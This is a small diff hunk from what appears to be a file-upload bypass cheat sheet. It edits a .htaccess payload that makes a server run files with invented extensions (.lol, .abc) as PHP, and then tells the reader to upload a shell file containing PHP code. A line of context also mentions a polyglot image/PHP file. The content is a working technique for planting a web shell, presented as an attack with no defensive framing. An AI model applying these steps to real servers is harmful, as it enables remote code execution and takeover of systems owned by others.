@@ -133,7 +133,7 @@ open('poly.bmp.php','wb').write(data)
 # Upload this FIRST if .htaccess is allowed
 AddType application/x-httpd-php .lol
 AddHandler application/x-httpd-php .abc
-php_value engine 1
+php_flag engine on
 ```
 
 Then upload `shell.lol` or `shell.abc` with PHP content.
